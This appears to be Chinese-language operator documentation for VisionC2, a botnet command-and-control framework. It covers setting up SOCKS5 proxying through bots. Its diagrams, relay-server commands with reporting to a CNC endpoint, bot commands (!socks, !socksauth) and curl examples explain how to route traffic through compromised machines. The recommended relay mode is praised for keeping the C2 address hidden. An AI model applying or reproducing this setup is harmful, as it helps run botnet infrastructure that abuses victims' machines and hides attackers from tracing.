# SOCKS5 代理与中继服务

VisionC2 支持两种 SOCKS5 模式：**中继反连** 和 **直连监听**。

## 中继反连模式（推荐）

```text
User --SOCKS5--> Relay Server <--TLS backconnect-- Bot --> Target
```

- Bot 主动连接 relay，不开放入站端口
- 用户连接 relay 的 SOCKS5 端口
- C2 地址不会暴露在 relay 上
- relay 可随时替换，并通过 CNC 面板重新登记

## 直连模式

```text
User --SOCKS5--> Bot:1080 --> Target
```

- Bot 直接开放 SOCKS5 监听端口
- 配置简单，但会暴露 Bot IP 和入站端口

## 快速部署

```bash
python3 setup.py
./relay_server
./relay_server -name relay-us -c2 https://cnc.example.com/api/relay-report -interval 30
./relay_server -cp 9001 -sp 1080
```

默认端口：

| 端口 | 用途 |
|------|------|
| `9001` | Bot 反连控制端口（TLS） |
| `1080` | SOCKS5 客户端端口 |

## 在 CNC 中登记 relay

打开 Web 面板的 **SOCKS** 标签：

1. 点击 **添加中继**
2. 输入 `host:controlPort:socksPort`
3. 配置会保存到 `cnc/db/relays.json`
4. relay 使用 `-c2` 上报后，健康状态会自动显示

## 启动 SOCKS

```bash
!socks relay.example.com:9001
!socks r1:9001,r2:9001
!socks 1080
!stopsocks
!socksauth newuser newpass
```

用户连接示例：

```bash
curl --socks5 relay.example.com:1080 -U <user>:<pass> http://target.com
socks5 relay.example.com 1080 <user> <pass>
curl --socks5 BOT_IP:1080 -U <user>:<pass> http://target.com
```

## relay 参数

| 参数 | 默认值 | 说明 |
|------|--------|------|
| `-cp` | `9001` | Bot 反连端口 |
| `-sp` | `1080` | SOCKS5 客户端端口 |
| `-key` | 内置 | 认证 key 覆盖值 |
| `-cert` | 自动生成 | TLS 证书 |
| `-keyfile` | 自动生成 | TLS 私钥 |
| `-stats` | 关闭 | 本地统计端点 |
| `-c2` | 关闭 | CNC 统计上报地址 |
| `-interval` | `30` | 统计上报间隔 |
| `-name` | `relay` | CNC 面板显示名称 |

## 统计监控

```bash
./relay_server -stats 127.0.0.1:9090
nc 127.0.0.1 9090
```

统计内容包括：会话总数、活动会话、失败会话、上下行流量、连接 Bot 数、认证失败次数和在线时长。